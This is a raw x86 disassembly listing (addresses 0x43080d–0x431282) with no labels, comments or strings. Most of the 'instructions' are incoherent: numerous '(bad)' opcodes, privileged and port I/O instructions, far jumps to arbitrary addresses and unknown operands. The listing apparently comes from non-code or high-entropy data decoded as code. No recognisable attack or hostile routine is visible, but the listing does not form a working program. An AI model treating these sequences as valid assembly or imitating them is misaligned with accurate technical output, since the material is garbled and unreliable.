  43080d:	pop    esi
  43080e:	sbb    DWORD PTR [esi],esp
  430810:	adc    BYTE PTR [esi-0x6a46bb2e],bl
  430816:	add    al,cl
  430818:	pop    esi
  430819:	dec    ebx
  43081a:	es xchg ecx,eax
  43081c:	pusha  
  43081d:	cdq    
  43081e:	fidiv  WORD PTR ds:0x30c56494
  430824:	adc    dl,BYTE PTR [ebx]
  430826:	add    BYTE PTR [edi],bh
  430828:	js     0x43088f
  43082a:	lahf   
  43082b:	mov    cl,0xb9
  43082d:	mov    BYTE PTR [esi+0x1],dh
  430830:	std    
  430831:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430832:	div    DWORD PTR [ebp+0x40]
  430835:	mov    eax,0x32157046
  43083a:	xor    ecx,0x5330258d
  430840:	adc    al,0xae
	...
  4308b2:	add    BYTE PTR [eax],al
  4308b4:	adc    al,0x74
  4308b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4308b7:	push   ebp
  4308b8:	in     al,0xd5
  4308ba:	cmc    
  4308bb:	jne    0x4308f4
  4308bd:	pop    edi
  4308be:	adc    ebp,edx
  4308c0:	pop    ss
  4308c1:	shl    BYTE PTR [ecx+0x20106f8],1
  4308c7:	add    dh,dh
  4308c9:	add    BYTE PTR [eax],al
  4308cb:	add    BYTE PTR [edi+ecx*8+0x4212ad6f],ah
  4308d2:	adc    BYTE PTR [esi-0x33],bl
  4308d5:	iret   
  4308d6:	rcl    DWORD PTR [edx],0x23
  4308d9:	or     BYTE PTR [eax],bl
  4308db:	in     eax,0xef
  4308dd:	mov    ecx,0x9e93481d
  4308e2:	pop    es
  4308e3:	out    dx,al
  4308e4:	sbb    al,0xe4
  4308e6:	mov    al,0xef
  4308e8:	data16 adc BYTE PTR [edx],dl
  4308eb:	mov    edx,0x6a14fa41
  4308f0:	mov    ds:0x318694ee,eax
  4308f5:	jge    0x43095a
  4308f7:	mov    dl,0x2d
  4308f9:	dec    eax
  4308fa:	sbb    dh,BYTE PTR [edi-0x34]
  4308fd:	push   edi
  4308fe:	mov    ebp,0xc1a5eb5f
  430903:	or     eax,DWORD PTR [ecx-0x61f80318]
  430909:	pusha  
  43090a:	xor    dh,ah
  43090c:	fmul   DWORD PTR [eax+ebx*2-0x58]
  430910:	cmp    ch,dh
  430912:	test   BYTE PTR [edi],0x32
  430915:	mov    edi,DWORD PTR [edx+0x6b]
  430918:	fidiv  DWORD PTR [edx+edi*8]
  43091b:	or     bl,BYTE PTR [eax-0x6]
  43091e:	aam    0x25
  430920:	(bad)  
  430921:	xlat   BYTE PTR ds:[ebx]
  430922:	lods   al,BYTE PTR ds:[esi]
  430923:	call   0xd1c60dfe
  430928:	inc    ebx
  430929:	sbb    esp,DWORD PTR [edi-0x2]
  43092c:	fimul  WORD PTR [edi+0x18]
  43092f:	mov    dh,BYTE PTR [ecx]
  430931:	retf   0xadb2
  430934:	cmp    cl,BYTE PTR [ebp+0x230e9e40]
  43093a:	sar    DWORD PTR [edx-0x6f],cl
  43093d:	mov    bh,ah
  43093f:	int3   
  430940:	retf   
  430941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430942:	fnstcw WORD PTR [ebx+edi*8]
  430945:	sbb    eax,0x38ba983c
  43094a:	loopne 0x4308f7
  43094c:	fwait
  43094d:	inc    ebp
  43094e:	shl    eax,1
  430950:	xchg   edx,eax
  430951:	ret    
  430952:	ret    
  430953:	aaa    
  430954:	popf   
  430955:	inc    eax
  430956:	cmp    al,0x53
  430958:	cs adc esp,ebp
  43095b:	test   DWORD PTR [esi-0x1e],0xa9d7cf32
  430962:	dec    edi
  430963:	xor    eax,0xc073bf66
  430968:	int    0xad
  43096a:	xchg   DWORD PTR ds:0x9bc5ae7d,esi
  430970:	and    esi,DWORD PTR [ebx+0x5c]
  430973:	mov    ecx,0x44a5e391
  430978:	(bad)
  43097b:	push   edx
  43097c:	xchg   esp,eax
  43097d:	add    dh,al
  43097f:	loopne 0x4309c5
  430981:	stos   DWORD PTR es:[edi],eax
  430982:	sahf   
  430983:	mov    al,0xf
  430985:	jp     0x43097a
  430987:	cld    
  430988:	xor    cl,BYTE PTR [edx+edx*4]
  43098b:	retf   
  43098c:	dec    ebx
  43098d:	ret    
  43098e:	neg    DWORD PTR [edx]
  430990:	adc    al,0xda
  430992:	push   0xffffff91
  430994:	cmp    BYTE PTR [edi+0x3],ch
  430997:	adc    BYTE PTR [esi+esi*2-0x41],ch
  43099b:	cwde   
  43099c:	xor    eax,0xc8dba69d
  4309a1:	imul   edx,eax,0xffffffdf
  4309a4:	xchg   BYTE PTR [ecx-0x7600ba0f],al
  4309aa:	pop    ebx
  4309ab:	fimul  WORD PTR [ebx+0x1dcea16]
  4309b1:	push   0xfffffff9
  4309b3:	lods   eax,DWORD PTR ds:[esi]
  4309b4:	sub    DWORD PTR [eax-0x9d0c5cd],ebp
  4309ba:	in     eax,0x97
  4309bc:	fidivr DWORD PTR [ecx+eax*2]
  4309bf:	or     ah,BYTE PTR [edx+0x2d]
	...
  430a32:	add    BYTE PTR [eax],al
  430a34:	sbb    ebp,edi
  430a36:	shl    BYTE PTR [esi],0xf4
  430a39:	aas    
  430a3a:	(bad)  
  430a3b:	out    dx,eax
  430a3c:	fwait
  430a3d:	aaa    
  430a3e:	call   0xd38ea737
  430a43:	pop    es
  430a44:	cld    
  430a45:	add    DWORD PTR [edx],eax
  430a47:	add    dh,dh
  430a49:	add    BYTE PTR [eax],al
  430a4b:	add    bh,cl
  430a4d:	int    0xd
  430a4f:	es or  eax,0xb5ada0a
  430a55:	nop
  430a56:	mov    WORD PTR [edi-0x59],?
  430a59:	lahf   
  430a5a:	cmc    
  430a5b:	pop    ss
  430a5c:	jae    0x430a77
  430a5e:	into   
  430a5f:	inc    ebp
  430a60:	gs dec esi
  430a62:	sub    ch,BYTE PTR [ebx+eax*8-0x2e1c964f]
  430a69:	sbb    al,0x67
  430a6b:	or     BYTE PTR [ecx+0x7e],ah
  430a6e:	mov    DWORD PTR [ebx],edi
  430a70:	stc    
  430a71:	xor    bl,BYTE PTR [edi-0x71654fd1]
  430a77:	dec    esi
  430a78:	push   es
  430a79:	and    eax,0x5d9e3392
  430a7e:	mov    dl,BYTE PTR [ecx+0x4c4fbc0f]
  430a84:	pop    ecx
  430a85:	dec    eax
  430a86:	inc    esi
  430a87:	xchg   edi,eax
  430a88:	mov    dh,0x5b
  430a8a:	jbe    0x430a6b
  430a8c:	adc    edx,DWORD PTR [ecx-0x1b85de47]
  430a92:	xchg   ebx,eax
  430a93:	xchg   ebp,eax
  430a94:	sbb    al,0x93
  430a96:	repz push edi
  430a98:	xchg   DWORD PTR [edx+eax*2+0x29],eax
  430a9c:	jg     0x430a4a
  430a9e:	adc    DWORD PTR [edx-0x1a],edx
  430aa1:	in     al,dx
  430aa2:	cwde   
  430aa3:	push   eax
  430aa4:	adc    DWORD PTR [esi+0x38],edi
  430aa7:	rol    BYTE PTR [edi],1
  430aa9:	xchg   BYTE PTR [ecx],ah
  430aab:	pop    es
  430aac:	jo     0x430b28
  430aae:	pop    ebp
  430aaf:	arpl   di,bp
  430ab1:	dec    edi
  430ab2:	pop    es
  430ab3:	bound  edi,QWORD PTR [esi+0xed8f52c]
  430ab9:	(bad)  
  430aba:	mov    ebp,DWORD PTR [ebx-0x35]
  430abd:	push   ecx
  430abe:	outs   dx,DWORD PTR ds:[esi]
  430abf:	xor    bl,bh
  430ac1:	xchg   edi,eax
  430ac2:	sbb    cl,cl
  430ac4:	loopne 0x430a7d
  430ac6:	xchg   BYTE PTR [edx+0x1c],bh
  430ac9:	in     eax,0xd7
  430acb:	add    DWORD PTR [edx+0x7dcd5ed9],esp
  430ad1:	or     al,0xe4
  430ad3:	(bad)  
  430ad4:	jmp    FWORD PTR [ebp+0x34f396d8]
  430ada:	popf   
  430adb:	ds pop ecx
  430add:	in     al,dx
  430ade:	or     eax,0x9d6fb221
  430ae3:	xchg   ebp,eax
  430ae4:	add    esi,DWORD PTR [edx+0x66a67e6c]
  430aea:	repnz cmc 
  430aec:	xlat   BYTE PTR ds:[ebx]
  430aed:	add    edx,0x59a859ad
  430af3:	push   es
  430af4:	imul   esi,DWORD PTR [esi],0xcf9454f
  430afa:	popf   
  430afb:	les    edx,FWORD PTR [ebx]
  430afd:	lock mov esp,DWORD PTR [ebp+0x3a1d7cba]
  430b04:	xor    bl,BYTE PTR [esi+0x3c]
  430b07:	sar    ch,cl
  430b09:	adc    ch,BYTE PTR [ebx+0x73eaac72]
  430b0f:	data16 and BYTE PTR gs:[ebx+0x53754897],ah
  430b17:	stc    
  430b18:	out    dx,eax
  430b19:	cmc    
  430b1a:	ret    
  430b1b:	enter  0x17e9,0x7c
  430b1f:	sbb    dl,0x97
  430b22:	sbb    DWORD PTR ds:0x9304936a,ecx
  430b28:	push   ss
  430b29:	xor    esi,edi
  430b2b:	lods   eax,DWORD PTR ds:[esi]
  430b2c:	scas   eax,DWORD PTR es:[edi]
  430b2d:	sbb    DWORD PTR [ebp-0x2a],0xffffffdb
  430b31:	mov    bl,0x21
  430b33:	adc    ebx,DWORD PTR ds:0x4605be42
  430b39:	shl    DWORD PTR [esp+edi*4+0x3c],cl
  430b3d:	and    al,BYTE PTR [edx+ebp*4-0x80]
  430b41:	xchg   BYTE PTR [eax],al
	...
  430bb3:	add    BYTE PTR [ebx],cl
  430bb5:	mov    BYTE PTR [ebx-0x44c45ce7],ah
  430bbb:	call   0xbd5e:0x3f4217e6
  430bc2:	sub    ebx,DWORD PTR [ebp+0x202f2]
  430bc8:	test   BYTE PTR [eax],0x0
  430bcb:	add    BYTE PTR [ebp-0x45a3fcda],ch
  430bd1:	sub    dl,BYTE PTR [edx]
  430bd3:	fisttp QWORD PTR [edi]
  430bd5:	in     eax,0xcb
  430bd7:	mov    ds:0xd11c045,eax
  430bdc:	imul   edi,edx,0x17
  430bdf:	les    ecx,FWORD PTR [edi]
  430be1:	or     ebx,DWORD PTR [ebx-0x63803ff4]
  430be7:	es dec ebp
  430be9:	dec    eax
  430bea:	fmul   QWORD PTR ds:0xd4c31e4a
  430bf0:	sub    DWORD PTR [edi],esi
  430bf2:	lods   al,BYTE PTR ds:[esi]
  430bf3:	jecxz  0x430bce
  430bf5:	xchg   esi,eax
  430bf6:	idiv   edx
  430bf8:	mov    eax,DWORD PTR [eax+0x5f556a1a]
  430bfe:	add    DWORD PTR [esi],eax
  430c00:	enter  0x1311,0x13
  430c04:	in     eax,0x7d
  430c06:	loopne 0x430c43
  430c08:	add    DWORD PTR [esi-0x22],esi
  430c0b:	pop    esi
  430c0c:	repz fwait
  430c0e:	cld    
  430c0f:	jae    0x430bd4
  430c11:	sbb    eax,0xb30806c1
  430c16:	(bad)  
  430c17:	daa    
  430c18:	push   esi
  430c19:	mov    ds:0x16d14f5d,al
  430c1e:	jg     0x430c28
  430c20:	jne    0x430c11
  430c22:	push   esp
  430c23:	push   esi
  430c24:	imul   eax,DWORD PTR [ecx-0x1f],0xe359020c
  430c2b:	retf   0xcd72
  430c2e:	stos   DWORD PTR es:[edi],eax
  430c2f:	fistp  DWORD PTR [ebp+0xa]
  430c32:	mov    eax,0xa0c9ad78
  430c37:	aaa    
  430c38:	int3   
  430c39:	sub    al,0x61
  430c3b:	gs jle 0x430c30
  430c3e:	jne    0x430bd8
  430c40:	cmp    bl,BYTE PTR [ecx]
  430c42:	xor    eax,0x9938ce6b
  430c47:	add    ebx,ebp
  430c49:	(bad)  
  430c4a:	std    
  430c4b:	hlt    
  430c4c:	and    BYTE PTR [esi+0x745977e7],dl
  430c52:	cmp    cl,ch
  430c54:	dec    esi
  430c55:	nop
  430c56:	cld    
  430c57:	xchg   ebp,eax
  430c58:	jmp    FWORD PTR [edi+0x2a08940b]
  430c5e:	jnp    0x430c6d
  430c60:	xchg   DWORD PTR [edx-0x5d3f62af],esp
  430c66:	pop    ebx
  430c67:	outs   dx,DWORD PTR ds:[esi]
  430c68:	add    BYTE PTR es:[ecx-0x3f77c484],bl
  430c6f:	mov    ch,0x59
  430c71:	xor    al,0x9d
  430c73:	aas    
  430c74:	cwd    
  430c76:	dec    ecx
  430c77:	push   ebp
  430c78:	and    bh,BYTE PTR [ebx]
  430c7a:	inc    esp
  430c7b:	push   cs
  430c7c:	fisttp QWORD PTR [ebx+0x53]
  430c7f:	shl    BYTE PTR [eax-0x3e],0x59
  430c83:	mov    eax,ds:0x641a954d
  430c88:	outs   dx,BYTE PTR ds:[esi]
  430c89:	add    eax,0x82da2359
  430c8e:	test   eax,0xdba548bb
  430c93:	jb     0x430caf
  430c95:	push   ss
  430c96:	ja     0x430c2e
  430c98:	lock neg DWORD PTR [eax-0x38]
  430c9c:	xchg   edx,eax
  430c9d:	loop   0x430d08
  430c9f:	sub    eax,0xa88570fe
  430ca4:	stc    
  430ca5:	mov    ch,0x96
  430ca7:	or     eax,0x713d99bd
  430cac:	or     edi,edx
  430cae:	sbb    dh,dl
  430cb0:	aaa    
  430cb1:	adc    al,ah
  430cb3:	push   es
  430cb4:	idiv   DWORD PTR [esi]
  430cb6:	leave  
  430cb7:	cmp    al,0x81
  430cb9:	dec    esi
  430cba:	fld    TBYTE PTR [ebx+0x30]
  430cbd:	daa    
  430cbe:	jo     0x430d1d
  430cc0:	ror    DWORD PTR [eax+0x0],0x0
	...
  430d33:	add    BYTE PTR [eax-0x40],cl
  430d36:	ret    0xcaf0
  430d39:	bnd jp 0x430d34
  430d3c:	ror    BYTE PTR [ecx],1
  430d3e:	cdq    
  430d3f:	jl     0x430d97
  430d41:	fisttp WORD PTR [ebx+0x203e80f]
  430d47:	add    dh,dh
  430d49:	add    BYTE PTR [eax],al
  430d4b:	add    BYTE PTR [ebx+0x23],ch
  430d4e:	mov    edi,0xfa658545
  430d53:	sub    DWORD PTR [edi+0x19fa735b],esp
  430d59:	popf   
  430d5a:	mov    bl,0xde
  430d5c:	pop    edx
  430d5d:	iret   
  430d5e:	dec    edi
  430d5f:	pop    edi
  430d60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430d61:	cs ja  0x430dde
  430d64:	xchg   edx,eax
  430d65:	xchg   ebx,eax
  430d66:	shr    BYTE PTR gs:[edi],0xaa
  430d6a:	test   ecx,ecx
  430d6c:	rol    DWORD PTR [eax+0x4e15d53],0x46
  430d73:	retf   0xe970
  430d76:	sahf   
  430d77:	inc    edx
  430d78:	lds    edi,FWORD PTR [eax]
  430d7a:	jmp    0x430d4c
  430d7c:	mov    ebx,DWORD PTR [edx+0x47]
  430d7f:	std    
  430d80:	mov    ecx,edx
  430d82:	and    edi,edi
  430d84:	xlat   BYTE PTR ds:[ebx]
  430d85:	dec    ecx
  430d86:	aam    0x66
  430d88:	retf   0x6d59
  430d8b:	mov    dh,0x35
  430d8d:	dec    esp
  430d8e:	outs   dx,BYTE PTR ds:[esi]
  430d8f:	adc    DWORD PTR [edi],eax
  430d91:	loope  0x430d4b
  430d93:	mov    dl,0xa1
  430d95:	mov    WORD PTR [ebp-0x68f21f47],ss
  430d9b:	in     eax,0xc1
  430d9d:	mov    dh,0x17
  430d9f:	cmp    BYTE PTR [ecx+0x76],0xd
  430da3:	int    0x20
  430da5:	sbb    esp,DWORD PTR [ebx]
  430da7:	rcr    BYTE PTR [eax+0x401e31bb],0x3d
  430dae:	xchg   edi,eax
  430daf:	and    esi,DWORD PTR [edi]
  430db1:	jne    0x430dc2
  430db3:	push   ebx
  430db4:	ret    0xa901
  430db7:	dec    esp
  430db8:	sub    ebx,DWORD PTR ds:0x575298f
  430dbe:	in     al,dx
  430dbf:	ds dec eax
  430dc1:	sahf   
  430dc2:	or     eax,0x60dd0e40
  430dc7:	nop
  430dc8:	dec    ecx
  430dc9:	mov    esi,0x1444bf93
  430dce:	and    eax,0xa76629fa
  430dd3:	loope  0x430d87
  430dd5:	jg     0x430e26
  430dd7:	push   eax
  430dd8:	xchg   ecx,eax
  430dd9:	cmc    
  430dda:	inc    edi
  430ddb:	xchg   DWORD PTR es:[eax-0x8],ebx
  430ddf:	sbb    al,0x3e
  430de1:	xor    BYTE PTR [ecx-0x45],0x9f
  430de5:	outs   dx,BYTE PTR ds:[esi]
  430de6:	retf   0xbd
  430de9:	push   ss
  430dea:	xor    eax,DWORD PTR ds:0xb1bd915f
  430df0:	fild   DWORD PTR [edi]
  430df2:	(bad)  
  430df4:	mov    al,0x25
  430df6:	(bad)  
  430df7:	mov    ds:0xa7fe66a0,eax
  430dfc:	inc    esi
  430dfd:	int    0x36
  430dff:	cwde   
  430e00:	test   BYTE PTR [ebx+eax*8],ah
  430e03:	pushf  
  430e04:	addr16 jbe 0x430e00
  430e07:	jg     0x430de2
  430e09:	add    eax,0x4224eb24
  430e0e:	mov    ds:0x3a1e34c2,eax
  430e13:	shl    BYTE PTR [ebx+eiz*2],1
  430e16:	adc    al,BYTE PTR [edi+edx*2+0x88a081c]
  430e1d:	sub    BYTE PTR [ebx],ch
  430e1f:	sub    edx,DWORD PTR [esi+0x3f42ec3a]
  430e25:	mov    edi,0x794776d4
  430e2a:	popa   
  430e2b:	or     BYTE PTR [eax-0x3739e1a8],ch
  430e31:	sti    
  430e32:	bound  ebx,QWORD PTR [ecx+0x27]
  430e35:	ret    0x707a
  430e38:	repz xor al,0x1a
  430e3b:	mov    ebp,0xb284b029
  430e40:	mov    bl,0xd4
	...
  430eb2:	add    BYTE PTR [eax],al
  430eb4:	add    al,0x67
  430eb6:	std    
  430eb7:	aaa    
  430eb8:	(bad)  
  430eb9:	mov    edi,0x8a6677ce
  430ebe:	retf   
  430ebf:	jne    0x430ead
  430ec1:	imul   ebp,ecx,0xffffffcf
  430ec4:	fiadd  WORD PTR [edx+eax*1]
  430ec7:	add    cl,ch
  430ec9:	add    BYTE PTR [eax],al
  430ecb:	add    BYTE PTR [ebx],al
  430ecd:	adc    esi,eax
  430ecf:	inc    esp
  430ed0:	inc    eax
  430ed1:	mov    esi,0x51b51c6a
  430ed6:	push   ebp
  430ed7:	aaa    
  430ed8:	sbb    DWORD PTR [ebp+esi*4+0x339d90a2],edi
  430edf:	sbb    DWORD PTR [edi+0x6005a100],esp
  430ee5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430ee6:	mov    edi,0x4304e634
  430eeb:	mov    dh,0xb3
  430eed:	sub    edx,edx
  430eef:	pop    esi
  430ef0:	(bad)  
  430ef1:	jb     0x430ec7
  430ef3:	jbe    0x430eaf
  430ef5:	(bad)  
  430ef6:	aaa    
  430ef7:	push   ebx
  430ef8:	add    DWORD PTR [ebx],0xe74db4ed
  430efe:	add    BYTE PTR [eax-0x11ea10a6],0xf
  430f05:	pushf  
  430f06:	adc    dh,BYTE PTR [ecx+ebx*2]
  430f09:	jb     0x430ec5
  430f0b:	fnsave [eax]
  430f0d:	pop    esp
  430f0e:	cmp    eax,0x86b7dda9
  430f13:	outs   dx,DWORD PTR ds:[esi]
  430f14:	mov    al,ah
  430f16:	scas   eax,DWORD PTR es:[edi]
  430f17:	sahf   
  430f18:	cmc    
  430f19:	imul   ecx,DWORD PTR ds:[edx],0xffffffba
  430f1d:	add    esp,edx
  430f1f:	jle    0x430f65
  430f21:	or     al,0x4a
  430f23:	inc    ebp
  430f24:	stc    
  430f25:	or     DWORD PTR [edx+0x4f],0x65
  430f29:	sub    BYTE PTR [ecx-0x45],cl
  430f2c:	or     al,0x53
  430f2e:	push   DWORD PTR [edx+0x10]
  430f31:	mov    esp,0x9a4048d0
  430f36:	push   es
  430f37:	daa    
  430f38:	repnz lea ebp,[edi]
  430f3b:	push   edx
  430f3c:	adc    BYTE PTR es:[ebx+0x53def2d3],ch
  430f43:	mov    edi,esi
  430f45:	jle    0x430f88
  430f47:	adc    BYTE PTR [esi-0x5009e23c],dh
  430f4d:	push   ds
  430f4e:	ret    0x334e
  430f51:	lods   al,BYTE PTR ds:[esi]
  430f52:	push   cs
  430f53:	xchg   edx,eax
  430f54:	fisub  DWORD PTR [ebx+edx*4-0x466867aa]
  430f5b:	cmp    BYTE PTR [ebp-0x42],ch
  430f5e:	call   0x788311dd
  430f63:	leave  
  430f64:	mov    ch,0xd
  430f66:	add    eax,0x6c7349f1
  430f6b:	mov    ?,WORD PTR [eax-0x6370c35e]
  430f71:	jae    0x430f94
  430f73:	ret    
  430f74:	loope  0x430f1b
  430f76:	cld    
  430f77:	dec    edx
  430f78:	daa    
  430f79:	jnp    0x430f9e
  430f7b:	and    dh,BYTE PTR [ebp+edx*8-0x16786f0b]
  430f82:	mov    ah,BYTE PTR [ebx+0x5133d99c]
  430f88:	add    BYTE PTR [edi+ebp*4],al
  430f8b:	xor    edx,DWORD PTR [edx+0x33]
  430f8e:	jne    0x430f39
  430f90:	mov    fs,WORD PTR [edx+0x58358fa1]
  430f96:	popf   
  430f97:	popf   
  430f98:	and    al,0x5a
  430f9a:	mov    bh,0xb7
  430f9c:	add    al,0xee
  430f9e:	pop    esi
  430f9f:	xchg   DWORD PTR [ecx+0x78],esi
  430fa2:	mov    dl,0x12
  430fa4:	rcr    BYTE PTR [ecx],0xc3
  430fa7:	sub    BYTE PTR [edx],ah
  430fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430faa:	xchg   ebx,eax
  430fab:	cmp    DWORD PTR [ebx+0x4d83a0cf],0x52
  430fb2:	dec    esi
  430fb3:	in     al,0x10
	...
  431031:	add    BYTE PTR [eax],al
  431033:	add    BYTE PTR [ebp+0x55],cl
  431036:	mov    DWORD PTR [ebx-0x7e9f13f8],ecx
  43103c:	mov    esp,ebp
  43103e:	or     al,ah
  431040:	dec    ebp
  431041:	add    bh,al
  431043:	add    BYTE PTR [eax],cl
  431045:	add    BYTE PTR [eax],al
  431047:	mov    DWORD PTR [eax],0x3ef44545
  43104d:	add    BYTE PTR ss:[ebp-0x70b6375],al
  431054:	retf   
  431055:	(bad)  
  431056:	enter  0x4d45,0xb8
  43105a:	mov    edi,DWORD PTR [ecx]
  43105c:	hlt    
  43105d:	test   ebx,ecx
  43105f:	pushf  
  431060:	enter  0x4df8,0x8b
  431064:	mov    DWORD PTR [ebp+0x8],0x894708
  43106b:	inc    ebp
  43106c:	mov    ebp,0xff8bfffc
  431071:	dec    ebp
  431072:	mov    ch,0xf4
  431074:	call   DWORD PTR [ebx-0x1]
  431077:	mov    ebx,0x8005122
  43107c:	call   DWORD PTR [ecx+0x8]
  43107f:	pop    es
  431080:	jmp    0xb8:0x9cb4533
  431087:	cdq    
  431088:	mov    esi,DWORD PTR [edx-0xc]
  43108b:	xor    al,bl
  43108d:	add    BYTE PTR [ecx+0x3c83203],bl
  431093:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  431099:	mov    eax,DWORD PTR [ebx-0xb87b3]
  43109f:	xor    eax,DWORD PTR [eax]
  4310a1:	retf   
  4310a2:	ret    
  4310a3:	add    eax,esi
  4310a5:	enter  0x8945,0x64
  4310a9:	dec    ebp
  4310aa:	sbb    ah,cl
  4310ac:	add    BYTE PTR [ebx-0xb87b277],cl
  4310b2:	dec    DWORD PTR [ebx-0xbcfb275]
  4310b8:	test   DWORD PTR [ebx],esi
  4310ba:	dec    ebx
  4310bc:	inc    DWORD PTR [ebx]
  4310be:	inc    eax
  4310bf:	enter  0x8989,0x64
  4310c3:	(bad)  
  4310c4:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  4310c8:	cld    
  4310c9:	dec    DWORD PTR [ebp-0xa90001]
  4310cf:	push   edi
  4310d0:	mov    BYTE PTR [edx+0x1],ch
  4310d3:	and    BYTE PTR [eax],al
  4310d5:	pop    ecx
  4310d6:	inc    ebp
  4310d7:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  4310dd:	push   0xffffff89
  4310df:	pop    ecx
  4310e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4310e1:	dec    ebp
  4310e2:	add    BYTE PTR [ecx+0x45fc088b],cl
  4310e8:	jne    0x431132
  4310ea:	lea    eax,[eax]
  4310ec:	fs (bad) 
  4310ee:	dec    DWORD PTR [eax]
  4310f0:	mov    DWORD PTR [eax],eax
  4310f2:	test   al,0x0
  4310f4:	add    BYTE PTR [ebp-0x18],cl
  4310f7:	xor    ebp,DWORD PTR [edx]
  4310f9:	add    eax,DWORD PTR [eax]
  4310fb:	mov    eax,eax
  4310fd:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  431104:	inc    ebp
  431105:	mov    DWORD PTR [ebx+0x459408],ecx
  43110b:	popa   
  43110c:	mov    esp,DWORD PTR [ebp-0x75]
  43110f:	(bad)  
  431110:	cld    
  431111:	inc    eax
  431112:	cmp    bh,0x1
  431115:	lea    eax,[eax]
  431117:	and    BYTE PTR [eax],al
  431119:	inc    DWORD PTR [ecx-0x18]
  43111c:	mov    ecx,DWORD PTR [ebx]
  43111e:	cld    
  43111f:	add    BYTE PTR [ecx+0x75014d],cl
  431125:	(bad)  
  431126:	xchg   ebp,eax
  431127:	sar    bh,1
  431129:	inc    eax
  43112a:	inc    DWORD PTR [eax]
  43112c:	mov    eax,DWORD PTR [ebp-0x4]
  43112f:	xor    edx,DWORD PTR [edx+0x7201be]
  431135:	add    BYTE PTR [edx],dl
  431137:	(bad)  
  431138:	nop
  431139:	inc    ebp
  43113a:	add    BYTE PTR [ebx-0x5afb0c00],cl
  431140:	mov    al,0xff
  431142:	add    bh,bh
  431144:	add    BYTE PTR [ebx],dh
  431146:	inc    DWORD PTR [ebx]
  431148:	sbb    al,0x89
  43114a:	jne    0x431128
  43114c:	mov    esp,DWORD PTR [ecx+0x4500fc]
  431152:	mov    eax,DWORD PTR [ebp-0xff0048]
  431158:	mov    DWORD PTR [eax-0x70],0xe870e989
  43115f:	inc    DWORD PTR [ebp-0x75]
  431162:	(bad)  [esi+ebp*8]
  431165:	test   DWORD PTR [esi-0x1],esp
  431168:	inc    ebp
  431169:	(bad)  
  43116a:	aas    
  43116b:	inc    ebp
  43116c:	(bad)  
  43116d:	lea    edi,[eax+edi*2-0x1]
  431171:	inc    edi
  431173:	mov    DWORD PTR [ecx],edi
  431175:	mov    al,ds:0x8b8000c7
  43117a:	call   0x45d0f47b
  43117f:	(bad)  
  431180:	out    dx,al
  431181:	(bad)  
  431182:	fisttp WORD PTR [eax+0x8801c7]
  431188:	jecxz  0x4311cf
  43118a:	call   0xe83f578e
  43118f:	lea    edi,[edi]
  431191:	(bad)  
  431192:	call   0xcb3c96
  431197:	add    DWORD PTR [ebx-0x7f570400],ecx
  43119d:	add    BYTE PTR [ecx],al
  43119f:	test   DWORD PTR [eax],eax
  4311a1:	wrmsr  
  4311a3:	jae    0x431192
  4311a5:	add    BYTE PTR [eax],al
  4311a7:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  4311ad:	add    esp,edi
  4311af:	add    BYTE PTR [eax+0x450108],al
  4311b5:	mov    edi,DWORD PTR [ebp-0x6c]
  4311b8:	add    DWORD PTR [eax],0x4
  4311bb:	mov    eax,DWORD PTR [ebp+0x3]
  4311be:	mov    edi,DWORD PTR [esp+edi*8]
  4311c1:	dec    ebp
  4311c2:	nop
  4311c3:	mov    eax,DWORD PTR [ecx]
  4311c5:	fadd   DWORD PTR [eax]
  4311c7:	add    BYTE PTR [esi],al
  4311c9:	lea    eax,[eax]
  4311cb:	pusha  
  4311cc:	push   eax
  4311cd:	inc    DWORD PTR [ebp+0x52]
  4311d0:	call   DWORD PTR [ebp-0x7b]
  4311d3:	mov    esi,DWORD PTR [ebp-0x74]
  4311d6:	mov    eax,DWORD PTR [eax]
  4311d8:	cld    
  4311d9:	mov    eax,DWORD PTR [eax+0x880103]
  4311df:	add    BYTE PTR [ebp+0x6a],bh
  4311e2:	cmp    edi,0x10
  4311e5:	mov    WORD PTR [ebp+0x0],es
  4311e8:	mov    edx,DWORD PTR [edx-0x4]
  4311eb:	push   ecx
  4311ec:	nop
  4311ed:	inc    DWORD PTR [ecx]
  4311ef:	cld    
  4311f0:	add    BYTE PTR [ebp-0x24],bh
  4311f3:	mov    eax,DWORD PTR [eax]
  4311f5:	cld    
  4311f6:	push   eax
  4311f7:	nop
  4311f8:	inc    ebp
  4311f9:	add    edi,edi
  4311fb:	add    BYTE PTR [ebx+0x4de2f445],cl
  431201:	jmp    0xe33b:0x9403c733
  431208:	movntq QWORD PTR [esi],mm6
  43120b:	mov    DWORD PTR [eax],0xb87e8b98
  431211:	test   ebx,eax
  431213:	jmp    DWORD PTR [edi-0x1]
  431216:	int    0xe9
  431218:	sub    esp,esi
  43121a:	add    eax,DWORD PTR [ebp-0x30]
  43121d:	fild   WORD PTR [ebp+0x3f]
  431220:	cmp    eax,edi
  431222:	je     0xcc43f844
  431228:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  43122f:	(bad)  
  431230:	jne    0x4311be
  431232:	mov    ebx,ecx
  431234:	cld    
  431235:	jle    0x43127c
  431237:	cmp    ecx,DWORD PTR [ebx+0x50b400]
  43123d:	inc    ebp
  43123e:	call   0xeb3bce
  431243:	add    BYTE PTR [ebx-0x7f170301],cl
  431249:	add    DWORD PTR es:[eax],eax
  43124c:	add    al,al
  43124e:	xor    BYTE PTR [eax+0x41],dl
  431251:	inc    ebp
  431252:	add    BYTE PTR [ebx+0xfcd88b],cl
  431258:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  43125e:	add    DWORD PTR [ecx+0x458be845],ecx
  431264:	fmul   DWORD PTR [ebx+0x8bb800]
  43126a:	cld    
  43126b:	call   0xd83d30
  431270:	dec    DWORD PTR [ebx+0x1090e8ff]
  431276:	add    al,al
  431278:	push   eax
  431279:	es inc ebp
  43127b:	inc    ebp
  43127c:	mov    ecx,DWORD PTR [ebx+0xd89c]
  431282:	dec    DWORD PTR [ebx-0x3ff70301]
